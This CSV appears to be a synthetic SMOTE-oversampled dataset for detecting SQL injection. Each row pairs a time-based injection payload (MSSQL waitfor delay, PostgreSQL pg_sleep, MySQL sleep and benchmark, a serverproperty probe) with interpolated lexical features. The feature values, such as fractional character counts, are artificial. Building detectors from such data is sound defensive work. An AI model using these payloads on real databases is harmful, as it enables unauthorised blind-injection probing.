id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000991,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,2.2094118724132255,112.30478686740035,31.05713891567363,4.03866949129641,53.24764795172672,5.057138915673629,36.295240722884245,17.704759277115752,0.4694015216255511,0.046435326344164744,0.32469382621255566,0.15946932581772846,3.2952407228842473,0.0,2.0,0.0,0.0,0.0,0.3523796385578764,6.0,0.0,0.0,1.3523796385578764,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.3523796385578764,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.35237963855787635,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.3523796385578764
SMOTE_000992,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,0.0630457478575196,40.83428134203816,22.933712536815264,4.058311490758606,15.955808357876844,2.033143731592368,9.922664626284476,12.922664626284476,0.39103155834928705,0.05036616351895943,0.24248258560720626,0.3161196925245473,2.0,0.0,2.0,0.0,0.0,0.0,0.0,1.9779041789384215,0.0,3.955808357876843,0.9889520894692105,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.9889520894692108,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000993,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,1.4728702765867006,37.600028914215706,17.0,3.3392445080565936,13.0,0.6166642571486913,13.833357428513086,10.150007228553926,0.3536697805489534,0.018686795671172467,0.3572393979789729,0.27040402580090117,0.0,0.38333574285130867,2.0,0.0,0.0,0.0,0.0,2.7666714857026173,0.0,5.0,-5.551115123125783e-17,2.0,0.0,0.38333574285130867,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000994,attack,time,1 waitfor delay '0:0:10'--,nearest_attack_euclidean,R000021,0.24362642981503693,26.273886080296208,17.27388608029621,3.969727202903025,12.219108864236969,4.8356683518222745,2.945222783940757,6.273886080296209,0.4645287810255666,0.1853076262356056,0.11259818131708571,0.23756541142174217,2.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.21910886423696763,0.05477721605924196,2.0,1.0,0.0,1.0,0.0,0.0,0.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000995,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,1.1202233962312957,36.33709302421063,16.629211886198817,3.3441636204436316,13.0,0.0,12.966304910409452,10.370788113801181,0.36263909861851495,0.0,0.3495794601741743,0.28778144120731075,0.0,0.6292118861988187,2.0,0.0,0.0,0.0,0.0,2.741576227602363,0.0,5.0,-5.551115123125783e-17,2.0,0.0,0.6292118861988187,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000996,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.03439220711200903,36.83768420917685,16.0,3.0128545000544253,11.0,0.0,16.870147367341477,8.967536841835368,0.2988052987323097,0.0,0.45773211236117256,0.24346258890651779,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.9675368418353694,0.0,4.0,-5.551115123125783e-17,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000997,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,2.329303588320565,34.034236988507374,16.958902283525216,3.3531087932693566,11.479451141762608,2.636981279694341,12.397255708813036,7.520548858237392,0.3507086043017479,0.0527396255938868,0.3580538246003478,0.23849794550401748,0.0,0.7602744291186964,0.0,0.0,0.0,0.0,0.0,2.479451141762607,0.0,3.0410977164747854,0.23972557088130364,0.0,0.0,0.7602744291186962,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7602744291186966,0.23972557088130364,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000998,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,0.39143042611800954,34.35078774597372,22.567191830649147,4.259255878435989,15.711461220432765,2.2164040846754265,4.855730610216382,11.567191830649145,0.4574599327247991,0.06689293128757418,0.14087542047000526,0.3347717155176214,2.0,0.0,2.0,0.0,0.0,0.0,0.0,0.9278653051081911,0.0,3.7114612204327644,0.9278653051081909,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.9278653051081911,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000999,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,2.285427659894884,45.38521956082881,16.61478043917119,2.9558075288837538,12.229560878342381,0.0,21.540878243315237,11.614780439171192,0.26972095905054716,0.0,0.4742198694360432,0.2560591715134096,0.0,1.3852195608288091,1.2295608783423817,0.0,0.0,0.38521956082880915,0.0,4.0,0.0,4.614780439171191,-5.551115123125783e-17,1.6147804391711909,0.0,1.0,0.6147804391711909,0.0,0.0,0.38521956082880915,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.38521956082880915,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3852195608288091
SMOTE_001000,attack,time,""";waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000025,1.080815468460358,31.112432141238333,21.934918569486,4.29109138951505,15.467459284743,2.3550271435046666,2.1775135717523355,11.112432141238333,0.49671271163421604,0.07770370869175076,0.07112913196018289,0.3544544477138503,2.1775135717523333,0.8224864282476667,2.0,0.0,0.0,0.0,0.8224864282476667,0.0,0.0,3.289945712990667,-5.551115123125783e-17,2.0,1.0,0.8224864282476667,1.0,0.0,0.0,0.0,-1.1102230246251565e-16,0.8224864282476667,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001001,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,3.6382508587604008,43.21967155848902,18.304917889622253,3.2475575013940605,12.152458944811126,6.762294724055636,17.457376834433383,6.847541055188873,0.2869218923412936,0.13923432297611915,0.40498553561875805,0.16885824906382912,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.5762294724055637,0.0,1.6950821103777458,0.5762294724055635,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.4237705275944365,0.5762294724055635,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001002,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,0.5705694222248381,31.413314532821733,18.026352216935287,3.9369485269210394,15.463245320644688,4.0,4.334257882015873,7.615811330161172,0.48631456864059475,0.138807799930536,0.12316667683384303,0.2517109545950262,3.1026352216935287,0.0,2.0,0.0,0.0,0.0,0.0,0.20527044338705736,0.0,0.10263522169352868,0.10263522169352857,2.1026352216935287,1.0,0.0,1.0,0.0,0.0,0.0,0.10263522169352857,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001003,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,2.303180847962894,44.49175929734718,16.0,2.7844590052224643,11.0,0.0,22.994506198231456,10.497253099115728,0.24751802210777604,0.0,0.5166557441771055,0.23582623371511854,0.5027469008842725,0.9945061982314551,0.0,0.0,0.0,1.0,0.0,4.0,0.0,4.0,-5.551115123125783e-17,1.0,0.5027469008842724,0.49725309911572757,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001004,attack,time,""";waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000025,1.8193554169303015,34.5617311433726,23.0,4.285203001203579,16.0,2.0,4.277094349664534,12.284636793708067,0.46875937630033415,0.05859492203754177,0.11413380861472552,0.3585118930473986,2.0,0.7153632062919333,2.0,0.0,0.0,0.0,0.7153632062919333,0.5692735874161334,0.0,4.0,0.28463679370806666,2.0,1.0,0.7153632062919333,1.0,0.0,0.0,0.0,0.2846367937080667,0.7153632062919333,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001005,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,2.266389031084779,30.691256808343535,19.76844260625765,4.078099243748963,14.384221303128825,3.0771857979141157,3.922814202085883,9.30703550521471,0.4702514673820236,0.10615766064582749,0.12575895558866484,0.29783191638348405,2.5385928989570576,0.0,2.0,0.0,0.0,0.0,0.0,0.4614071010429419,0.0,1.8456284041717683,0.461407101042942,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.461407101042942,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001006,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,0.06054323997478447,33.26421191685045,17.0,3.4948790437633113,13.0,0.0,10.211369533480358,10.05284238337009,0.3912003549289826,0.0,0.3064857060895912,0.3023139389814262,0.0,1.0,2.0,0.0,0.0,0.0,0.0,2.0528423833700895,0.0,5.0,-5.551115123125783e-17,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_001007,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,2.6025972452093034,45.561320016639726,16.438679983360274,2.9017736166806762,11.877359966720547,0.0,22.245280066558905,11.438679983360274,0.26095847260198457,0.0,0.4878314988707035,0.2512100285273119,0.0,1.561320016639727,0.8773599667205465,0.0,0.0,0.5613200166397267,0.0,4.0,0.0,4.438679983360274,-5.551115123125783e-17,1.4386799833602733,0.0,1.0,0.43867998336027325,0.0,0.0,0.5613200166397267,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5613200166397267,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.5613200166397267
SMOTE_001008,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,1.110577671812078,38.389918324564796,17.0,3.3109324282958577,13.0,1.0,14.491598603803999,9.8983197207608,0.3467549237580186,0.02667345567369374,0.3665478590436929,0.2600237615245947,0.0,0.0,2.0,0.0,0.0,0.0,0.0,2.8983197207608,0.0,5.0,-5.551115123125783e-17,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_001009,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,0.9947485012249456,38.346658018711565,21.862853436590672,4.029725781021274,15.431426718295336,2.379048854469776,8.673329009355784,11.862853436590672,0.4075356523493439,0.0676130867171072,0.21873523865986583,0.30611602227368306,2.189524427234888,0.0,2.0,0.0,0.0,0.0,0.0,1.6209511455302243,0.0,3.2419022910604482,0.8104755727651118,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.8104755727651121,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001010,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,1.4678626134410138,31.631781902661775,16.0,3.271386729490993,11.0,0.0,12.10542552212942,8.526356380532356,0.3537138806991339,0.0,0.3755433431610393,0.2707427761398268,0.0,1.2631781902661776,0.0,0.0,0.0,0.2631781902661774,0.0,2.2631781902661774,0.0,4.0,-5.551115123125783e-17,0.2631781902661776,0.0,1.0,0.0,0.7368218097338225,0.0,0.2631781902661774,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001011,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,0.34966733363372576,43.023988072699325,23.36142644155345,4.069913310252016,17.373420477903114,2.07228528831069,10.505997018174831,13.07228528831069,0.39870146003210977,0.048397214802170255,0.2440812997589872,0.3088200254067328,2.1445705766213803,0.0,2.0,0.0,0.0,0.0,0.0,2.0,0.0,3.78314413506793,1.0,2.1445705766213803,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.07228528831069016,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.07228528831069
SMOTE_001012,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,1.6752325627483085,32.27155686071966,20.953667645539745,4.153357421411911,14.976833822769873,2.6821107848200842,4.317889215179914,10.294723037949788,0.46544367621738725,0.08818070237805675,0.13202998754253834,0.31434563386201764,2.341055392410042,0.0,2.0,0.0,0.0,0.0,0.0,0.6589446075899583,0.0,2.635778430359831,0.6589446075899578,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.6589446075899578,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001013,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,0.41924926176519234,40.34256396103218,22.50692297077413,4.013878512419082,15.753461485387067,1.917820495129022,10.0,12.671281980516088,0.39054759610077966,0.04726201949610167,0.24876153761247466,0.313428846790644,1.8356409902580442,0.0,2.0,0.0,0.0,0.0,0.0,2.0,0.0,4.082179504870978,0.9178204951290221,2.0,0.9178204951290221,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.08217950487097792,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.917820495129022,0.917820495129022,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.917820495129022
SMOTE_001014,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,1.4158469568124525,45.0,17.0,3.0740066546775076,13.0,0.5166608556558996,20.0,11.4833391443441,0.28888888888888886,0.011481352347908882,0.4444444444444444,0.2551853143187578,0.0,0.4833391443441004,2.0,0.0,0.0,0.0,0.0,4.0,0.0,5.0,-5.551115123125783e-17,2.0,0.0,0.4833391443441004,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_001015,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,1.8213231710659135,35.882935215452235,22.04513662704141,4.080465765151305,15.162201411589175,1.4414676077261168,7.117064784547766,12.162201411589175,0.4216826279947287,0.03895858399259775,0.2015018720192907,0.33785691599338286,1.4414676077261168,1.0,2.0,0.0,0.0,0.0,0.7207338038630584,1.2792661961369418,0.0,4.279266196136941,-5.551115123125783e-17,2.0,0.7207338038630584,1.0,1.0,0.0,0.0,0.0,1.0,0.7207338038630584,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.2792661961369416,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7207338038630584,0.7207338038630584,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.7207338038630584
SMOTE_001016,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,0.40643979150552845,44.57717664204386,16.859058880681285,3.0738250227083403,13.0,0.0,19.71811776136257,11.859058880681285,0.2917971977002274,0.0,0.44220728382033786,0.2659955184794347,0.0,0.859058880681286,2.0,0.0,0.0,0.0,0.0,4.0,0.0,5.0,-5.551115123125783e-17,2.0,0.0,0.8590588806812859,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_001017,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.09647287925985237,37.0487584278427,16.0,3.008573836705233,11.0,0.0,17.13080235005312,8.917956077789583,0.3033892858239319,0.0,0.45461614508702375,0.24199456908904435,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.9179560777895825,0.0,4.0,-5.551115123125783e-17,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001018,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,0.7044444849983028,44.26715939515335,16.755719798384447,3.073691848790748,13.0,0.0,19.5114395967689,11.75571979838445,0.29392959146190817,0.0,0.4405669809267373,0.26550342761135454,0.0,0.755719798384449,2.0,0.0,0.0,0.0,0.0,4.0,0.0,5.0,-5.551115123125783e-17,2.0,0.0,0.7557197983844488,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_001019,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,1.3727809291139474,27.967140075645908,18.967140075645908,4.091293108173821,13.573712060516726,3.8197159546124544,2.6065719848708184,7.967140075645909,0.48301592142144417,0.14203091121798297,0.09537152776638158,0.2795816395941913,2.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,1.573712060516727,0.39342801512918174,2.0,1.0,0.0,1.0,0.0,0.0,0.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001020,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,1.394728977885019,41.803275646732814,17.0,3.1905354684875227,13.0,0.543325092390402,17.259950554342414,11.0,0.3131914716915049,0.012073890942008933,0.40972646901213583,0.2650081683543503,0.0,0.45667490760959784,2.0,0.0,0.0,0.0,0.0,3.5433250923904023,0.0,5.0,-5.551115123125783e-17,2.0,0.0,0.45667490760959784,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_001021,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,1.833543906821033,34.89620309510512,16.655133677233902,3.342447273168744,12.310267354467804,0.0,12.620534708935608,9.965401031701706,0.3549360428615336,0.0,0.36028446062439334,0.2847794965140731,0.0,1.0,1.3102673544678045,0.0,0.0,0.0,0.0,2.655133677233902,0.0,4.655133677233902,-5.551115123125783e-17,1.310267354467804,0.0,1.0,0.6551336772339023,0.34486632276609785,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.34486632276609785,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.344866322766098
SMOTE_001022,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.048380365402000136,37.78886711239554,17.0,3.336562138286147,13.0,0.0,13.831093689916436,10.957773422479109,0.34429404109956774,0.0,0.3656598250743915,0.29004613382604083,0.0,1.0,2.0,0.0,0.0,0.0,0.0,2.957773422479109,0.0,5.0,-5.551115123125783e-17,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
